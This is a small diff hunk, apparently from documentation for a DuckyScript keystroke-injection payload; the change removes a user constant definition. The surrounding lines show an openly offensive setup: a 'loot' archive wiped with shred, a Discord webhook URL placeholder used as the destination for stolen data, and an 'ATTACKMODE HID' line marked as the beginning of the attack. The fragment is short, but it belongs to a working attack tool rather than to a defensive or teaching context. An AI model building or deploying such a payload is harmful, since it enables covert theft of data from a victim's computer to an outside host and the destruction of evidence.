@@ -78,7 +78,6 @@ shred -fuz ~/.loot.tar.gz
 ```
 REM Place Discord webhook and user constants:
 DEFINE #WEBHOOK_URL https://discord.com/api/webhooks/PLACE/WEBHOOK/HERE
-DEFINE #USER PLACE_USER_HERE
 
 REM Begin attack:
 ATTACKMODE HID
